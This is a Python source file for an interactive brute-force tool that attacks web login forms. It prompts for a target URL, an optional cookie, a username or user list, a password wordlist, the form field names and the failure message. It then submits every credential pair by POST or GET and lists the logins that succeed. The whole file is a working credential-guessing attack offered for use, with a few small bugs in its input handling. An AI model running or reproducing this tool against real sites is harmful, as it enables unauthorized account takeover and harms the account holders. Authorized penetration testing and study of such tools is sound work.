"""
TO DO:

1) Put a output options
2) Put progress percentage (checked)
3) Put animated text.
4) Improve cracking function



"""


import requests  # It allows to automate de process of sending POST and GET request.
import termcolor
import os
import time
from alive_progress import alive_bar

ASCII_ART = termcolor.colored("""
                                                       ~^.                                          
                                         .^~          ?@@@@#5~                                      
                                    .7G&@@@@         ^@@@@@@@@@P:                                   
                                  !#@@@@@@@5         ^?JP&@@@@@@@P                                  
                                ~&@@@@@@@#P.              .?&@@@@@&.                                
                               Y@@@@@@G^                     P@@@@@&                                
                              7@@@@@@^                        B@@@@@7                               
                              @@@@@@:                         !@@@@@P                               
                             :@@@@@#                          ?@@@@@Y                               
                             .@@@@@&                          5@@@@@7                               
                              &@@@@@.                         G@@@@@~                               
                              G@@@@@~                         #@@@@@:                               
                              ?@@@@@5                    ^^^::&@@@@@:                               
                              :@@@@@#  ...:^^~7?JY      B@@@@@@@@@@@@@&#!                           
                           ^?YG@@@@@@@@@@@@@@@@@@Y    .&@@@@@@@@@@@@@@@@@~                          
                          B@@@@@@@@@@@@@@@@@@@@@B    :&@@@@@@@@@@@@@@@@@@~                          
                         .@@@@@@@@@@@@@@@@@@@@@@.   ^@@@@@@@@@@@@@@@@@@@@:                          
                          &@@@@@@@@@@@@@@@@@@@@~   7@@@@@@@@@@@@@@@@@@@@@.                          
                          G@@@@@@@@@@@@@@@@@@@Y   .PB#&@@@@@@@@@@@@@@@@@@                           
                          ?@@@@@@@@@@@@@@@@@@@!^^^    Y@@@@@@@@@@@@@@@@@&                           
                          :@@@@@@@@@@@@@@@@@@@@@@P  .#@@@@@@@@@@@@@@@@@@B                           
                           @@@@@@@@@@@@@@@@@@@@@#  !@@@@@@@@@@@@@@@@@@@@P                           
                           B@@@@@@@@@@@@@@@@@@@@. P@@@@@@@@@@@@@@@@@@@@@J                           
                           Y@@@@@@@@@@@@@@@@@@@~  .^7Y&@@@@@@@@@@@@@@@@@!                           
                           ^@@@@@@@@@@@@@@@@@@@&BGP. ^@@@@@@@@@@@@@@@@@@^                           
                           .@@@@@@@@@@@@@@@@@@@@@@& ~@@@@@@@@@@@@@@@@@@@.                           
                            &@@@@@@@@@@@@@@@@@@@@@^~@@@@@@@@@@@@@@@@@@@@.                           
                            P@@@@@@@@@@@@@@@@@@@@5~@@@@@@@@@@@@@@@@@@@@5                            
                            ~@@@@@@@@@@@@@@@@@@@&  .....:::^^~~!!77??!.                             
                             ^G&&##BGP5Y?7!~^:..                                                    
                                                                                                    

""", "red"
)

ASCII_TEXT = termcolor.colored("""
                                     ___  ____ _  _ ___ ____ 
                                     |__] |__/ |  |  |  |___ 
                                     |__] |  \ |__|  |  |___ 
""", "red")


def banner():
    print(ASCII_ART)
    print(ASCII_TEXT, end=4*"\n")

def break_line(x=1):
    print(x*'\n')

def cls():
    """ Clear the terminal."""    
    os.system('cls' if os.name == 'nt' else 'clear')  #clear multiplataform    

def input_header(text, color='blue'):
    print(
        termcolor.colored('[+]', color=color), text, end=''
        )
    return input()

def trying_text(username ,password):
    print(
        termcolor.colored('[>>]', color="yellow"), f'Trying {username}:{password}',
        )

def found_text(username, password):
    print(
        termcolor.colored('[=]', color="green", attrs=["bold"]), 'Successful login ==>', termcolor.colored(f'{username}:{password}', color="green", attrs=["bold"])           
        )

def failed_text():
    print(termcolor.colored('[-] ', color='red', attrs=['bold']), "Failed!")


def test_int_or_back(input_data):
    """Process the user input and says if it is int or not.If it is, then it break the loop.

    Args:
        input_data (str): User input

    Returns:
        bolean
    """
    global LOOP
    
    if input_data.isdigit() and input_data == '1' or input_data == '2':
        # we verify if input data is digit
        LOOP = False 
    
    else:
        print()
        print(
            termcolor.colored('[x]', color="red"), 'Enter just 1 or 2', end=2*'\n'
            )
        return LOOP

def animated_text(text):
    global scaning_status
    # scaning_status = True
    # while scaning_status:
    # cls()
    for char in text:           
        os.sys.stdout.write(termcolor.colored(char, attrs=['bold']))
        # os.sys.stdout.flush()
        time.sleep(0.5)


def cracking(data_dict, found_list, password, url, username):   

    if request_protocol == '1':
        if cookie_value != '':
            response = requests.post(url, data=data_dict, cookies={'Cookie': cookie_value})

            if failed_login_message in response.content.decode():
                failed_text()
                pass
            else:
                found_text(username, password)            
                found_list.append(f'{username}:{password}')

        else:
            response = requests.post(url, data=data_dict)
            if failed_login_message in response.content.decode():
                failed_text()
                pass
            else:
                found_text(username, password)                
                found_list.append(f'{username}:{password}')
    
    elif request_protocol == '2':

            if cookie_value != '':
                response = requests.get(url, data=data_dict, cookies={'Cookie': cookie_value})

                if failed_login_message in response.content.decode():
                    failed_text()
                    pass

                else:
                    found_text(username, password)
                    found_list.append(f'{username}:{password}')

            else:
                response = requests.get(url, data=data_dict)               
                if failed_login_message in response.content.decode():
                    failed_text()
                    pass
                else:
                    found_text(username, password)
                    print()
                    found_list.append(f'{username}:{password}')


def brute_func(username_file, url, username_field, password_field, button_name, button_type):
    global total_attempt
    found_list = []  # Here we'll store all the matched credentials.

    if brute_type == '1':  # Single user brute.
        username_file = [username]  # Transforming the single username into a list to use 'for' option

    with open(password_list_file, 'r') as passwords_file:
        total_passwords = len(passwords_file.readlines())  # Count total passwords
        passwords_file.seek(0)  # Reset file pointer to the beginning

        print(termcolor.colored('Scanning', attrs=['bold']), end='')
        animated_text('...')
        print()

        for username_entry in username_file:
            username_entry = username_entry.strip()
            with open(password_list_file, 'r') as passwords_file:
                with alive_bar(total_passwords, title="Scanning", manual=False) as bar:
                    passwords_file.seek(0)
                    for password in passwords_file:
                        password = password.strip()
                        data_dict = {
                            f'{username_field}': username_entry,
                            f'{password_field}': password,
                            f'{button_name}': button_type,
                        }
                        trying_text(username_entry, password)
                        cracking(data_dict=data_dict, found_list=found_list, password=password, url=url, username=username_entry)
                        total_attempt += 1
                        bar()
        

        break_line(2)
        print(80 * "=")
        print(termcolor.colored('[=]', color="blue", attrs=["bold"]), termcolor.colored('Matched Credentials: ', attrs=["bold"]))
        for credentials in found_list:
            print(termcolor.colored(f'{credentials}', color="green"))
        print(80 * "=")



##########################################################################################################################

total_attempt = 0  # attempt count
LOOP = True

cls()

banner()

while LOOP:
    print(
        termcolor.colored('[!!] ', color="yellow", attrs=["bold"]),\
            termcolor.colored('Set the BRUTE type:')
        )
    print(
        termcolor.colored('  [1]', color="magenta"), 'Password brute (Single user).'
    ) 
    print(
        termcolor.colored('  [2]', color="magenta"), 'User and Password brute.'
    )
    brute_type = input_header('Enter the wanted option: ', color='yellow')       
    test_int_or_back(brute_type)


if brute_type == "1":  # Single User brute.
    LOOP = True  # Restoring the LOOP value
    cls()
    banner()

    url = input_header('Enter page URL: ')
    cookie_value = input_header("Enter Cookie value(Optional): ")
    username = input_header ('Enter username for the account to bruteforce: ')
    password_list_file = input_header('Enter the path of password list file: ')
    username_field = input_header("Enter the username's field name: ")
    password_field = input_header("Enter the password's field name: ")
    button_name = input_header("Enter the Login botton name: ")
    button_type = input_header("Enter the Login botton type: ")
    failed_login_message = input_header('Type the failed login message: ')

    while LOOP:
        print(
            termcolor.colored('[!!]', color="yellow"), 'The following request protocol are avaiable:'
            )
        print(
            termcolor.colored('  [1]', color="magenta"), 'POST'
        ) 
        print(
            termcolor.colored('  [2]', color="magenta"), 'GET'
        )
        request_protocol = input_header('Choose the protocol number: ', color='yellow')

        test_int_or_back(request_protocol)

    break_line(2)

    # PUT TRYING MESSAGE AND PERCENTEAGE #############################
        
    brute_func(
        username, url, username_field , password_field, button_name, button_type
        )   


elif brute_type == '2':
    LOOP = True  # Restoring the LOOP value
    cls()
    banner()

    url = input_header('Enter page URL: ')
    cookie_value = input_header("Enter Cookie value(Optional): ")
    username_list_file = input_header ('Enter the path of username list file: ')
    password_list_file = input_header('Enter the path of password list file: ')
    username_field = input_header("Enter the username's field name: ")
    password_field = input_header("Enter the password's field name: ")
    button_name = input_header("Enter the Login botton name: ")
    button_type = input_header("Enter the Login botton type: ")
    failed_login_message = input_header('Type the failed login message: ')

    while LOOP:
        print(
            termcolor.colored('[!!]', color="yellow"), 'The following request protocol are avaiable:'
            )
        print(
            termcolor.colored('  [1]', color="magenta"), 'POST'
        ) 
        print(
            termcolor.colored('  [2]', color="magenta"), 'GET'
        )
        request_protocol = input_header('Choose the protocol number: ', color='yellow')

        test_int_or_back(request_protocol)

    break_line(2)

    # PUT TRYING MESSAGE AND PERCENTEAGE #############################

    with open(username_list_file, 'r') as username_file:
        brute_func(
            username_file, url, username_field, password_field, button_name, button_type
        )